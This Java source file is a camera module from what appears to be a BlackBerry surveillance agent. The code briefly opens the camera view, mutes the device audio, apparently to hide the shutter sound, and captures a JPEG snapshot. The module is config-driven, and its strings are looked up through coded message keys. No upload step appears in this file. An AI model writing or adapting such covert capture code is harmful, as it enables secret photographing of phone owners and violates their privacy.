package blackberry.module;

import java.io.IOException;
import java.util.Vector;

import javax.microedition.media.Manager;
import javax.microedition.media.MediaException;
import javax.microedition.media.Player;
import javax.microedition.media.control.VideoControl;

import net.rim.device.api.system.Audio;
import net.rim.device.api.ui.Field;
import net.rim.device.api.util.StringUtilities;
import blackberry.LocalScreen;
import blackberry.Main;
import blackberry.Messages;
import blackberry.config.ConfModule;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Utils;

public class ModuleCamera extends BaseInstantModule {
    //#ifdef DEBUG
    static Debug debug = new Debug("ModCamera", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    private VideoControl control;
    private Player player;

    private blackberry.module.ModuleCamera.EncodingProperties[] _encodings;

    public static String getStaticType() {
        return Messages.getString("1k.3"); //$NON-NLS-1$
    }

    void ModuleCamera() {
        //#ifdef DEBUG
        debug.trace("ModuleCamera");
        //#endif
    }

    protected boolean parse(ConfModule conf) {
        //#ifdef DEBUG
        debug.trace("parse: " + conf);
        //#endif
        return true;
    }

    public void actualStart() {
        //#ifdef DEBUG
        debug.trace("snapshot"); //$NON-NLS-1$
        //#endif

        if (!phoneCall()) {
            //#ifdef DEBUG
            debug.trace("actualStart, No phonecall, skipping phonecall"); //$NON-NLS-1$
            //#endif
            return;
        }

        byte[] jpegPicture = takeSnapshot();
        if (jpegPicture == null) {
            
            //#ifdef DEBUG
            Debug.ledFlash(Debug.COLOR_RED);
            debug.error("actualStart, null picture");
            //#endif
            return;
        }else{
            Debug.ledFlash(Debug.COLOR_WHITE);
        }

        //#ifdef DEBUG
        debug.trace("actualStart, snapshot size: " + jpegPicture.length);
        //#endif

    }

    public final class EncodingProperties {
        /** The file format of the picture */
        private String _format;

        /** The width of the picture */
        private String _width;

        /** The height of the picture */
        private String _height;

        /** Booleans that indicate whether the values have been set */
        private boolean _formatSet;
        private boolean _widthSet;
        private boolean _heightSet;

        /**
         * Set the file format to be used in snapshots
         * 
         * @param format
         *            The file format to be used in snapshots
         */
        public void setFormat(String format) {
            _format = format;
            _formatSet = true;
        }

        /**
         * Set the width to be used in snapshots
         * 
         * @param width
         *            The width to be used in snapshots
         */
        void setWidth(String width) {
            _width = width;
            _widthSet = true;
        }

        /**
         * Set the height to be used in snapshots
         * 
         * @param height
         *            The height to be used in snapshots
         */
        void setHeight(String height) {
            _height = height;
            _heightSet = true;
        }

        /**
         * @see Object#toString()
         */
        public String toString() {
            // Return the encoding as a coherent String to be used in menus
            StringBuffer display = new StringBuffer();

            display.append(_width);
            display.append(" x ");
            display.append(_height);
            display.append(" ");
            display.append(_format);

            return display.toString();
        }

        /**
         * Return the encoding as a properly formatted string to be used by the
         * VideoControl.getSnapshot() method.
         * 
         * @return The encoding expressed as a formatted string.
         */
        String getFullEncoding() {
            StringBuffer fullEncoding = new StringBuffer();

            fullEncoding.append("encoding=");
            fullEncoding.append(_format);

            fullEncoding.append("&width=");
            fullEncoding.append(_width);

            fullEncoding.append("&height=");
            fullEncoding.append(_height);

            return fullEncoding.toString();
        }

        /**
         * Checks whether all the fields been set
         * 
         * @return true if all fields have been set.
         */
        boolean isComplete() {
            return _formatSet && _widthSet && _heightSet;
        }
    }

    /**
     * Initialize the list of encodings
     */
    private void initializeEncodingList() {
        try {
            // Retrieve the list of valid encodings
            String encodingString = System
                    .getProperty("video.snapshot.encodings");

            // Extract the properties as an array of word
            String[] properties = StringUtilities
                    .stringToKeywords(encodingString);

            // The list of encodings
            Vector encodingList = new Vector();

            // Strings representing the three properties of an encoding as
            // returned by System.getProperty().
            String encoding = "encoding";
            String width = "width";
            String height = "height";

            EncodingProperties temp = null;

            for (int i = 0; i < properties.length; ++i) {
                if (properties[i].equals(encoding)) {
                    if (temp != null && temp.isComplete()) {
                        // Add a new encoding to the list if it
                        // has been properly set.
                        encodingList.addElement(temp);

                    }
                    temp = new EncodingProperties();

                    // Set the new encoding's format
                    ++i;
                    temp.setFormat(properties[i]);
                    //#ifdef DEBUG
                    debug.trace("initializeEncodingList: "
                            + encodingList.size() + " = " + temp + " : "
                            + temp.getFullEncoding());
                    //#endif
                } else if (properties[i].equals(width)) {
                    // Set the new encoding's width
                    ++i;
                    temp.setWidth(properties[i]);
                } else if (properties[i].equals(height)) {
                    // Set the new encoding's height
                    ++i;
                    temp.setHeight(properties[i]);
                }
            }

            // If there is a leftover complete encoding, add it
            if (temp != null && temp.isComplete()) {
                encodingList.addElement(temp);
            }

            // Convert the Vector to an array for later use
            _encodings = new EncodingProperties[encodingList.size()];
            encodingList.copyInto((Object[]) _encodings);
        } catch (Exception e) {
            // Something is wrong, indicate that there are no encoding options
            _encodings = null;

        }
    }

    private byte[] takeSnapshot() {

        try {
            player = Manager.createPlayer("capture://video");
            player.realize();
            player.start();
            
            control = (VideoControl) player.getControl("VideoControl");
            
            Field cameraView = (Field) control.initDisplayMode(
                    VideoControl.USE_GUI_PRIMITIVE,
                    "net.rim.device.api.ui.Field");
            control.setDisplayFullScreen(true);
            control.setVisible(true);
            
            synchronized (Main.getInstance().getEventLock()) {
                getScreen().add(cameraView);
            }
            
            
            initializeEncodingList();
            String encoding = _encodings[1].getFullEncoding();
            encoding = "encoding=jpeg&width=1024&height=768&quality=normal";
            //#ifdef DEBUG
            debug.trace("takeSnapshot, encoding: " + encoding);
            //#endif
            

            Utils.sleep(500);
            Audio.setVolume(0);
            byte[] jpeg = control.getSnapshot(encoding);
            player.close();
            synchronized (Main.getInstance().getEventLock()) {
                getScreen().delete(cameraView);
            }
            return jpeg;

        } catch (IOException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("takeSnapshot");
            //#endif
        } catch (MediaException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("takeSnapshot");
            //#endif
        }

        return null;
    }

    private LocalScreen getScreen() {

        return Main.getInstance().getLocalScreen();
    }

    private boolean phoneCall() {
        return true;
    }

}
